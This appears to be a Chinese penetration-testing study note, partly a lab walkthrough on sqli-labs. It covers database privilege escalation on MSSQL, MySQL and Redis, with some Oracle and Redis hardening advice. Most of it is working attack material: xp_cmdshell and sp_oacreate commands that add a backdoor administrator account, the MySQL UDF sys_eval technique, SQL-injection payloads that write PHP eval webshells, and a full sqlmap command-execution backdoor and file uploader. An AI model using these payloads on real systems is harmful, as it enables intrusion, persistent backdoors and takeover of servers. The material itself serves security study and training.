+<p>​    解释：开启xp_cmdshell</p>
+<p>​    exec sp_configure ‘xp_cmdshell’;    #查看cmdshell命令开启状态</p>
+<p>​    sp_configure：显示或更改当前服务器的全局配置设置。</p>
+<p>​    xm_cmdshell：查看该命令是否开启，默认0，要手动开启（开启后可执行系统命令）</p>
+<p><strong>3、exec master..xp_cmdshell ‘whoami’;</strong></p>
+<p>​    <img src="/./images/sqlinject9.png"></p>
+<p>​    解释：验证是否可以执行命令‘ whoami ’可以换成‘ ipconfig ’、‘ net user ’等</p>
+<p>​    注意：xp_cmdshell执行whoami时不会显示账号名（数据库账号类型不是sysadmin不能执行xp_cmdshell）</p>
+<p>​              master..xp_cmdshell的全写是master.dbo.xp_cmdshell</p>
+<h2 id="sp-oacreate提权操作"><a href="#sp-oacreate提权操作" class="headerlink" title="sp_oacreate提权操作"></a><strong>sp_oacreate提权操作</strong></h2><p><strong>简述：</strong>sp_oacreate的提权语句，主要是用来调用OLE对象（Object Linking and Embedding的缩写，VB中的OLE对象），利用OLE对象的run方法执行系统命令。在oacreate的官方文档里明确指出了，如果要使用OLE对象，必须要开启 ‘Ole Automation Procedures’，也就是EXEC sp_configure ‘Ole Automation Procedures’, 1;执行这条语句前要执行EXEC sp_configure ‘show advanced options’, 1; 官方对这句话的解释是：show advanced options,“显示高级选项”选项用来显示 sp_configure 系统存储过程高级选项。 当“显示高级选项” 设置为 1 时，可以使用 sp_configure 列出高级选项。 默认值为 0。</p>
+<p><strong>前提条件：</strong></p>
+<p>​    1、账号拥有sysadmin属性即可（可以是SA、Administrator等高权限账户）</p>
+<p><strong>注意：</strong></p>
+<p>​        xp_cmdshell不能执行系统增、删账号的操作（无权限，相当于普通账户，即使时SA或Administrator也不行）</p>
+<p>​        不能通过xp_cmdshell写入文件，只能执行系统命令</p>
+<p>​        可以执行上传的C2</p>
+<p><strong>1、EXEC sp_configure ‘show advanced options’, 1;</strong></p>
+<p>​    解释：sp_configure的作用是显示或更改当前服务器的全局配置设置，执行成功返回0，失败返回1</p>
+<p><strong>2、EXEC sp_configure ‘Ole Automation Procedures’, 1;</strong></p>
+<p>​    解释：该选项默认没开启，默认值为0，需要手动开启（1）</p>
+<p><strong>使用示例：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable">@shell</span> <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--使用sp_oacreate调用wscript.shell组件，将返回的对象存储到@shell变量中。</span></span><br><span class="line"><span class="keyword">exec</span> sp_oacreate <span class="string">&#x27;wscript.shell&#x27;</span>,<span class="variable">@shell</span> output</span><br><span class="line"></span><br><span class="line"><span class="comment">--使用sp_oamethod 调用@shell对象中的Run方法，执行添加用户的命令，null是run方法的返回值，我们不需要用返回值，所以写null.</span></span><br><span class="line"><span class="keyword">exec</span> sp_oamethod <span class="variable">@shell</span>,<span class="string">&#x27;run&#x27;</span>,<span class="keyword">null</span>,<span class="string">&#x27;c:\windows\system32\cmd.exe /c net user margin margin /add&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">exec</span> sp_oacreate <span class="string">&#x27;wscript.shell&#x27;</span>,<span class="variable">@shell</span> output</span><br><span class="line"></span><br><span class="line"><span class="comment">--使用sp_oamethod 调用@shell对象中的Run方法，执行添加用户的命令</span></span><br><span class="line"><span class="keyword">exec</span> sp_oamethod <span class="variable">@shell</span>,<span class="string">&#x27;run&#x27;</span>,<span class="keyword">null</span>,<span class="string">&#x27;c:\windows\system32\cmd.exe /c net localgroup administrators margin /add&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="沙盒提权"><a href="#沙盒提权" class="headerlink" title="沙盒提权"></a><strong>沙盒提权</strong></h2><p><strong>前提条件：</strong></p>
+<p>​    1、账号拥有sysadmin属性即可（可以是SA、Administrator等高权限账户）</p>
+<p>​    2、关闭沙盒之后执行代码，且系统有沙箱</p>
+<ul>
+<li></li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-</span>提权语句</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">解释：sp_configure的作用是显示或更改当前服务器的全局配置设置，执行成功返回<span class="number">0</span>，失败返回<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、<span class="keyword">exec</span> sp_configure <span class="string">&#x27;Ad Hoc Distributed Queries&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">解释：开启 “ Ad Hoc Distributed Queries ” ，默认为<span class="number">0</span>，需要手动开启（<span class="number">1</span>）</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、<span class="keyword">exec</span> master..xp_regwrite <span class="string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="string">&#x27;SandBoxMode&#x27;</span>,<span class="string">&#x27;REG_DWORD&#x27;</span>,<span class="number">0</span>;</span><br><span class="line">关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。</span><br><span class="line">查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、<span class="keyword">exec</span> master.dbo.xp_regread <span class="string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>, <span class="string">&#x27;SandBoxMode&#x27;</span></span><br><span class="line"><span class="comment">--执行系统命令select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user margin margin /add&quot;)&#x27;)</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> openrowset(<span class="string">&#x27;microsoft.jet.oledb.4.0&#x27;</span>,<span class="string">&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;</span>,<span class="string">&#x27;select shell(&quot;net localgroup administrators margin /add&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h1 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h1><h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p><strong>漏洞原理</strong></p>
+<p>​		自定义函数，是数据库功能的一种扩展。用户通过自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像调用本机函数 version() 等方便。</p>
+<p><strong>补充</strong></p>
+<p>​		如果是 MySQL &gt;&#x3D; 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。</p>
+<p>​		kali自带了UDF模块，路径：&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql</p>
+<p><strong>利用条件</strong></p>
+<p>​    1.sqlmap的UDF：sqlmap根目录&#x2F;data&#x2F;udf&#x2F;mysql，Kali的UDF：&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql</p>
+<p>​    2.那么动态链接库文件去哪里找呢？实际上我们常用的工具 sqlmap 和 Metasploit 里面都自带了对应系统的动态链接库文件。</p>
+<p>​    3.sqlmap还自带了动态链接库，攻击者为了防止被误杀都经过编码处理过，不能被直接使用。不过可以利用 sqlmap 自带的解码工具cloak.py 来解码使用，cloak.py 的位置为：sqlmap根目录&#x2F;extra&#x2F;cloak&#x2F;cloak.py</p>
+<p>​        解码32位的windows动态链接库：python3 cloak.py -d -i lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll</p>
+<p>​        其他linux和windows动态链接库解码类似；</p>
+<p>​        或者直接使用metasploit自带的动态链接库，无需解码</p>
+<p>为什么要提权：<strong>MYSQL不支持执行系统命令，提权用与执行系统命令</strong></p>
+<p><strong>【示例】</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">create table udfeval(shellcode longblob);    </span><br><span class="line">#创建表</span><br><span class="line">insert into udfeval values(load_file(&#x27;F:/udf.dll&#x27;));  </span><br><span class="line">#将DLL信息写入表中</span><br><span class="line">select shellcode from udfeval into dumpfile &#x27;C:\\windows\udf.dll&#x27;;  </span><br><span class="line">#将表里面的信息导出到C:\\windows\udf.dll</span><br><span class="line">select shellcode from udfeval into dumpfile &#x27;D:/phpstudy/sqlibs/MySQL5.7.26/lib/plugin/udf.dll&#x27;;</span><br><span class="line">#将表里面的信息导出到（数据库安装路径的lib/plugin/下）D:/phpstudy/sqlibs/MySQL5.7.26/lib/plugin/udf.dll</span><br><span class="line">create function sys_eval returns string soname &#x27;D:/phpstudy/sqlibs/MySQL5.7.26/lib/plugin/udf.dll&#x27;;</span><br><span class="line">#导出函数sys_eval，可以添加路径（udf模块不在lib\plugin\下）</span><br><span class="line">select sys_eval(&#x27;whoami&#x27;); //进行whoami命令执行</span><br><span class="line"></span><br><span class="line">============================或者=============================</span><br><span class="line"></span><br><span class="line">create function sys_eval returns string soname &#x27;lib_mysqludf_sys_64.dll&#x27;;</span><br><span class="line">#再dll中导出函数sys_eval</span><br><span class="line">SELECT sys_eval(&quot;netstat -ab&quot;);</span><br><span class="line">#执行导出函数</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意事项：</strong></p>
+<p>​    1、udf.dll存放位置分为2种情况。（MYSQL不能执行系统命令，只有使用UDF提权后才行）</p>
+<p>​        Mysql版本大于5.1：udf.dll文件必须放在MySQL安装目录的lib\plugin文件夹下。</p>
+<p>​        Mysql版本小于5.1：udf.dll 文件导到 C:\Winnt\udf.dll 下。</p>
+<p>​    2、使用于Windows、Linux的MYSQL数据库</p>
+<h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p><strong>原理</strong></p>
+<p>​		利用C:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录下的nullevt.mof文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行（有点像条件竞争）</p>
+<p><strong>先决条件</strong></p>
+<p>​    1、Win sever 03以后无法使用（仅做了解，未作记录）</p>
+<p>​    2、Mysql启动身份具有权限去读写c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof目录</p>
+<p>​    3、secure-file-priv参数不为null</p>
+<h2 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h2><h3 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into_outfile"></a>into_outfile</h3><p><strong>或者into_dumpfile</strong></p>
+<p><strong>SQL读写文件的条件</strong></p>
+<p>1、数据库允许导入导出secure_file_priv&#x3D;ON，默认为NULL(不允许导入导出，无法通过sql语句开启，难以利用其写入shell)</p>
+<p>​    select @@secure_file_priv；</p>
+<p>​     人为开启条件：配置文件”my.ini”中[mysqld]追加secure_file_priv &#x3D; ‘ ‘标识做限制。</p>
+<p>​     secure_file_priv&#x3D;’&#x2F;tmp&#x2F;‘ 限制导入导出的路径只能在&#x2F;tmp&#x2F;下</p>
+<p><strong>2****、当前用户是否拥有文件权限（可有可无，有更好），Y&#x3D;有，N&#x3D;无</strong></p>
+<p>​    SELECT File_priv FROM mysql.user WHERE User&#x3D;’账户’ </p>
+<p><strong>3、获取到当前网站绝对路径</strong></p>
+<p><strong>4、网站目录具有写入权限</strong></p>
+<p><strong>注意</strong>：</p>
+<p>​    1、写入文件必须加网站绝对路径，否则会出现一下情况：</p>
+<p>​        路径 .\：会写入在数据库的data文件夹下（如：F:\phpstudy_pro\extensions\mysql5.7.26\data\）</p>
+<p>​        路径\：会写入在网站所在磁盘的根路径下（如F：\）</p>
+<p>​    2、写入文件常用有三种方式，如下：</p>
+<p>​        union select 1,’<?php eval($_POST[123]);?>‘ INTO OUTFILE ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;test.php’ #</p>
+<p>​        union select 1,’<?php eval($_POST[123]);?>‘ INTO dumpfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;test.php’#</p>
+<p>​        set global general_log &#x3D; “ON”;set global general_log_file&#x3D;’C:&#x2F;wamp64&#x2F;www&#x2F;ma.php’;select ‘<?php eval($_POST[cmd]);?>‘; （MYSQL日志写入，登录到数据库执行）</p>
+<p><strong>关于outfile和dumpfile的区别:</strong></p>
+<p>​    outfile后面不能接0x开头或者char转换以后的路径，只能是单引号路径,但是值的部分可以时16进制</p>
+<p>​    outfile文件中一行的末尾会自动换行，且可以导出全部数据，同时如果文本中存在\n等字符,会自动转义成\n,也就是会多加一个\n</p>
+<p>​    outfile函数可以导出多行，outfile函数在将数据写到文件里时有特殊的格式转换，</p>
+<p>​    dumpfile只能导出一行数据，dumpfile则保持原数据格式</p>
+<p>​    dumpfile一行的末尾不会换行且只能导出部分数据；</p>
+<p>​    dumpfile不会自动对文件内容进行转义,而是原意写入（UDF提权时使用dumpfile来写入）</p>
+<p><strong>示例：SQL-lib-11，使用into outfile写入文件</strong></p>
+<p>使用BP抓包，闭合SQL语句，使用ORDER BY查看回显列</p>
+<p><img src="/./images/sqlinject12.png"></p>
+<p>将PHP一句话结果16进制编码后写入到网站根目录（网站根目录获取？）</p>
+<p>注意：文件中只要包含php相关代码就会被执行，无论有什么字符</p>
+ <?php eval($_POST[a]);?><pre><code> 0x203c3f706870206576616c28245f504f53545b615d293b3f3e
+</code></pre>
+<p> uname&#x3D;dsa’union select 1,0x203c3f706870206576616c28245f504f53545b615d293b3f3e into outfile ‘F:\phpstudy_pro\WWW\sql\shell.php’ –+&amp;passwd&#x3D;dsa&amp;submit&#x3D;Submit</p>
+<p><img src="/./images/sqlinject13.png"></p>
+<p><img src="/./images/sqlinject14.png"></p>
+<h3 id="OS-Shell"><a href="#OS-Shell" class="headerlink" title="OS-Shell"></a>OS-Shell</h3><p>使用<strong>UDF提权</strong>（User Defined Functions），通过into oufile向服务器写入两个文件，一个可以直接执行系统命令，一个进行上传文件</p>
+<p><strong>利用这条命令的先决条件：</strong>利用工具SQLMAP</p>
+<p>​    要求为DBA（管理员账号），–is-dba（phpstudy搭建的一般为DBA）</p>
+<p>​    secure_file_priv没有具体值</p>
+<p>​    web目录具有写权限，能够使用单引号</p>
+<p>​    知道网站的绝对路径</p>
+<p>​    GPC为off，php主动转义的功能关闭</p>
+<p>​    PS：利用难度高</p>
+<p><strong>原理：</strong></p>
+<p>​    上传两个文件，一个用户执行系统命令、另一个用于上传文件</p>
+<p>​    <strong>使用：</strong>INTO OUTFILE ‘网站绝对路径\文件名.后缀’ LINES TERMINATED BY 写入文件的内容</p>
+<p><strong>实验示例：</strong></p>
+<p><strong>①kali上执行：</strong>sqlmap -u 192.168.64.1&#x2F;Less-1&#x2F;?id&#x3D;1 –os-shell</p>
+<p>选择网站对应的脚本语言，然后手动添加网站绝对路径（自动查找大概率会失败）</p>
+<p>会创建两个文件，一个上传文件、一个执行系统命令</p>
+<p><img src="/./images/sqlinject15.png"></p>
+<p><img src="/./images/sqlinject16.png"></p>
+<p><strong>②执行系统命令的文件内容</strong></p>
+<?php $c=$_REQUEST["cmd"];@set_time_limit(0);@ignore_user_abort(1);@ini_set("max_execution_time",0);$z=@ini_get("disable_functions");if(!empty($z)){$z=preg_replace("/[, ]+/",',',$z);$z=explode(',',$z);$z=array_map("trim",$z);}else{$z=array();}$c=$c." 2>&1\n";function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f("system")){ob_start();system($c);$w=ob_get_clean();}elseif(f("proc_open")){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f("shell_exec")){$w=shell_exec($c);}elseif(f("passthru")){ob_start();passthru($c);$w=ob_get_clean();}elseif(f("popen")){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f("exec")){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}echo"<pre>$w</pre>";?>
+
+<p>实例如下：</p>
+<p><img src="/./images/sqlinject17.png"></p>
+<p><strong>③上传文件</strong></p>
+<p><img src="/./images/sqlinject18.png"></p>
+<p><strong>④查看文件权限</strong></p>
+<p>select @@secure_file_priv;</p>
+<p><img src="/./images/sqlinject19.png"></p>
+<p><strong>补充解释</strong></p>
+<p>​    不管是GET还是POST都可以使用此方式</p>
+<p>​    使用到的关键SQL语句：INTO OUTFILE ‘网站绝对路径\文件名.后缀’ LINES TERMINATED BY 写入文件的内容</p>
+<p>SQL注入的内容（以GET为例）： </p>
+<p>GET &#x2F;Less-1&#x2F;?id&#x3D;-5906’ OR 2054&#x3D;2054 LIMIT 0,1 INTO OUTFILE ‘F:\phpstudy_pro\WWW\sql\Less-1\test.php’ LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d433a5c5c55736572735c5c7a68616e675c5c4465736b746f705c5c7068705c5c5048505475746f7269616c5c5c5757575c5c73716c692d6d61737465725c5c4c6573732d315c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a–%20- </p>
+<p>解码后的内容（文件上传脚本，可以自己写做免杀）：</p>
+<?php
+
+if (isset($_REQUEST["upload"])){$dir=$_REQUEST["uploadDir"];if (phpversion()<'4.1.0'){$file=$HTTP_POST_FILES["file"]["name"];@move_uploaded_file($HTTP_POST_FILES["file"]["tmp_name"],$dir."/".$file) or die();}else{$file=$_FILES["file"]["name"];@move_uploaded_file($_FILES["file"]["tmp_name"],$dir."/".$file) or die();}@chmod($dir."/".$file,0755);echo "File uploaded";}else {echo "<form action=".$_SERVER["PHP_SELF"]." method=POST enctype=multipart/form-data><input type=hidden name=MAX_FILE_SIZE value=1000000000><b>sqlmap file uploader</b><br><input name=file type=file><br>to directory: <input type=text name=uploadDir value=C:\\Users\\zhang\\Desktop\\php\\PHPTutorial\\WWW\\sqli-master\\Less-1\\> <input type=submit name=upload value=upload></form>";}
+
+?>
+
+
+
+<p><img src="/./images/sqlinject20.png"></p>
+<hr>
+<h1 id="ORACLE"><a href="#ORACLE" class="headerlink" title="ORACLE"></a>ORACLE</h1><h2 id="Oracle用户创建"><a href="#Oracle用户创建" class="headerlink" title="Oracle用户创建"></a><strong>Oracle用户创建</strong></h2><p>  1、选择用户名和验证方式</p>
+<p>  2、确定哟关乎存储对象所需要的表空间</p>
+<p>  3、确定可以使用表空间的容量</p>
+<p>  4、指定用户的缺省空间和临时空间</p>
+<p>  5、创建用户</p>
+<p>  6、授予用户特权以及角色</p>
+<h2 id="Oracle系统权限"><a href="#Oracle系统权限" class="headerlink" title="Oracle系统权限"></a><strong>Oracle系统权限</strong></h2><table>
+<thead>
+<tr>
+<th>权限</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CREATE PROCEDURE</td>
+<td>在用户自己的模式中创建过程</td>
+</tr>
+<tr>
+<td>CREATE ROLE</td>
+<td>~创建角色</td>
+</tr>
+<tr>
+<td>CREATE SEQUENCE</td>
+<td>~创建序列</td>
+</tr>
+<tr>
+<td>CREATE ATE SESSION</td>
+<td>连接到数据库服务器并列会话</td>
+</tr>
+<tr>
+<td>CREATE TABLE</td>
+<td>~创建表</td>
+</tr>
+<tr>
+<td>CREATE TABLESPACE</td>
+<td>~创建表空间</td>
+</tr>
+<tr>
+<td>CREATE TRIGGER</td>
+<td>~创建触发器</td>
+</tr>
+<tr>
+<td>CREATE USER</td>
+<td>~创建新用户</td>
+</tr>
+<tr>
+<td>CREATE VIEW</td>
+<td>~创建视图</td>
+</tr>
+<tr>
+<td>DROP TABLESPACE</td>
+<td>删除表空间</td>
+</tr>
+<tr>
+<td>DROP USER</td>
+<td>删除用户</td>
+</tr>
+</tbody></table>
+<h2 id="查询角色权限"><a href="#查询角色权限" class="headerlink" title="查询角色权限"></a><strong>查询角色权限</strong></h2><p>SELECT * FROM ROLE_SYS_PRIVS WHERE ROLE&#x3D;’角色名’ ; </p>
+<h2 id="预定义角色"><a href="#预定义角色" class="headerlink" title="预定义角色"></a><strong>预定义角色</strong></h2><p>​    CONNECT、RESOURCE、DBA  默认角色向后兼容</p>
+<p>​    DELETE_CATALOG_ROLE、EXECUTE_CATALO_ROLE、SELECT_CATALOG_ROLE   #默认角色-访问数据字典视图和包</p>
+<p>​    EXP_FULL_DATABASE、IMP_FULL_DATABASE   #导入导出工具</p>
+<p>​    AQ_USER_ROLE、AQ_ADMINISTRATOR_ROLE    #ORACLE高级查询功能</p>
+<p>​    RECOVERY_CATALOG_OWNER    #用于创建拥有恢复库的用户</p>
+<p>​    HS_ADMIN_ROLE</p>
+<h2 id="ORACLE角色管理"><a href="#ORACLE角色管理" class="headerlink" title="ORACLE角色管理"></a><strong>ORACLE角色管理</strong></h2><p>创建角色：create role username;</p>
+<p>​                 create role username identified by password;</p>
+<p>授权角色：grant create any table,create procedure to username;</p>
+<p>查看角色权限：select * from role_sys_privs;</p>
+<p>修改口令：alter role username not identified;</p>
+<p>​                 alter role username identified by password;</p>
+<h2 id="安全配置"><a href="#安全配置" class="headerlink" title="安全配置"></a><strong>安全配置</strong></h2><p>显示应用用户数据库权限：</p>
+<p>​		revoke select any tables from <username>;   #收回select any tables权限</p>
+<p>​         revoke dba from <username>;    #收回dba角色</p>
+<p>撤销publie角色的程序包执行权限：</p>
+<p>​		revoke execute on utl_file from public;  </p>
+<p>​    	对应权限：utl_file、utl_http、utl_tcp、utl_smtp、dbms_random</p>
+<p>锁定账户：alter user <username> account lock;</p>
+<p>限制库文件写权限：chmod 640 $oracle_base&#x2F;oradata&#x2F;*</p>
+<h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><p><strong>非关系数据库，端口&#x3D;6379，KEY-VALUE形式</strong></p>
+<h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a><strong>常用操作</strong></h2><p>有密码链接：redis-cli -h 主机ip -p 端口 -a 密码</p>
+<p>无密码连接：redis-cli -h 主机ip -p 端口</p>
+<p>配置key-value：set keyname “value”</p>
+<p>删除key-value：del <code>keyname</code></p>
+<p>获取value：get key</p>
+<p>清空当前选中的数据库：flushdb</p>
+<p>当前数据库的所有key：keys *</p>
+<p>键总数：dbsize</p>
+<p>查看字段类型：type key</p>
+<p>重命名：rename key1 key2</p>
+<p>Redis信息：info</p>
+<p>Redis主从信息：info replication</p>
+<p>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>
+<h2 id="Redis加固"><a href="#Redis加固" class="headerlink" title="Redis加固"></a><strong>Redis加固</strong></h2><p><strong>①禁止高危命令</strong>（需重启redis）</p>
+<p>​    修改redis.conf文件，禁止远程修改DB文件地址</p>
+<p>​        1、rename-command FLUSHALL “”  或者  rename-command FLUSHALL  “command_name”     #改变执行命令</p>
+<p>​        2、rename-command CONFIG “”      或者  rename-command FLUSHALL  “command_name”    #改变执行命令</p>
+<p>​        3、rename-command EVAL “”           或者  rename-command FLUSHALL  “command_name”    #改变执行命令</p>
+<p><strong>②低权限允许Redis服务</strong>（需重启redis）</p>
+<p>​    groupadd -r redis &amp;&amp; useradd -r -g redis redis</p>
+<p><strong>③为Redis添加密码验证</strong>（需重启Redis）</p>
+<p>​    修改redis.conf文件，添加requirepass mypassword</p>
+<p><strong>④限制访问地址</strong>（需重启Redis）</p>
+<p>​    修改redis.conf文件，新增 ” bind x.x.x.x “</p>
+<p>​    redis3.2之后增加<strong>protected-mode</strong>，需要配置绑定IP 或 设置访问密码（）否则报错</p>
+<p><strong>⑤修改默认端口</strong>（需重启Redis）</p>
+<p>​    修改redis.conf文件，Port xxxx</p>
+<p><strong>⑥保障authorized_keys文件安全</strong></p>
+<p>​    设置文件所属只读，其他用户无权限访问。chmod 400 ~&#x2F;.ssh&#x2F;authorized_keys</p>
+<p>​                                                                     chattr +i ~&#x2F;.ssh&#x2F;authorized_keys</p>
+<h2 id="protected-mode说明"><a href="#protected-mode说明" class="headerlink" title="protected-mode说明"></a><strong>protected-mode说明</strong></h2><p>protected-mode是redis本身的一个安全层，这个安全层的作用：就是只有【本机】可以访问redis，其他任何都不可以访问redis。这个安全层开启必须满足三个条件，不然安全层处于关闭状态：</p>
+<p>（1）protected-mode yes（处于开启）</p>
+<p>（2）没有bind指令。原文：The server is not binding explicitly to a set of addresses using the “bind” directive.</p>
+<p>（3）没有设置密码。原文：No password is configured。密码的优先级高。</p>
+<p>这时redis的保护机制就会开启。开启之后，只有本机才可以访问redis。 如果上面三个条件任何一个不满足，就不会开启保护机制。</p>
+<h2 id="Redis未授权"><a href="#Redis未授权" class="headerlink" title="Redis未授权"></a><strong>Redis未授权</strong></h2><p>​    1、写入ssh公钥（root运行redis）</p>
+<p>​    2、bind地址为0.0.0.0</p>
+<p>​    3、未开启密码保护</p>
+<p><strong>利用条件：</strong></p>
+<p>​    1、redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。</p>
+<p>​    2、没有设置密码认证（一般为空），可以免密码远程登录redis服务。</p>
+<p>​    3、redis使用root运行（service redis start是以redis普通账户运行的，redis-server &#x2F;etc&#x2F;redis&#x2F;redis.conf  #以root账户运行redis）</p>
+<p><strong>Kali上用redis-cli连接</strong></p>
+<p>​    无密码连接：<code>redis-cli -h host -p port</code></p>
+<p>​    有密码连接：<code>redis-cli -h hostip -p port -a password</code></p>
+<p>​    使用 ” ping “ 命令检查连接是否成功，回显 ” PONG “则连接成功</p>
+<p><img src="/./images/sqlinject2.png" alt="2.png"></p>
+<h3 id="写入Webshell文件"><a href="#写入Webshell文件" class="headerlink" title="写入Webshell文件"></a><strong>写入Webshell文件</strong></h3><p> <strong>前提条件：</strong></p>
+<p>​    1、redis未授权，能用redis-cli连上</p>
+<p>​    2、开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限。</p>
+<p>​    3、我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则可以任意写入一个路径为a&#x2F;b的文件。</p>
+<p>​    4、实列如下：写入&#x2F;root&#x2F;下失败（不是以root运行的不能访问），其它路径成功</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="keyword">set</span> dir <span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span> </span><br><span class="line">config <span class="keyword">set</span>  dbfilename shell.php </span><br><span class="line"><span class="keyword">set</span> x &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot; </span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<h3 id="写入SSH公钥"><a href="#写入SSH公钥" class="headerlink" title="写入SSH公钥"></a>写入SSH公钥</h3><p><strong>利用条件</strong></p>
+<p>​    服务端的Redis连接存在未授权，在攻击机上能用redis-cli直接登陆连接，并未登陆验证。</p>
+<p>​    服务端存在.ssh目录并且有写入的权限。</p>
+<p>​    必须是以root账户运行，redis-server &#x2F;etc&#x2F;redis&#x2F;redis.conf</p>
+<p>​    Redis主机上root目录下有“ .&#x2F;ssh ”目录</p>
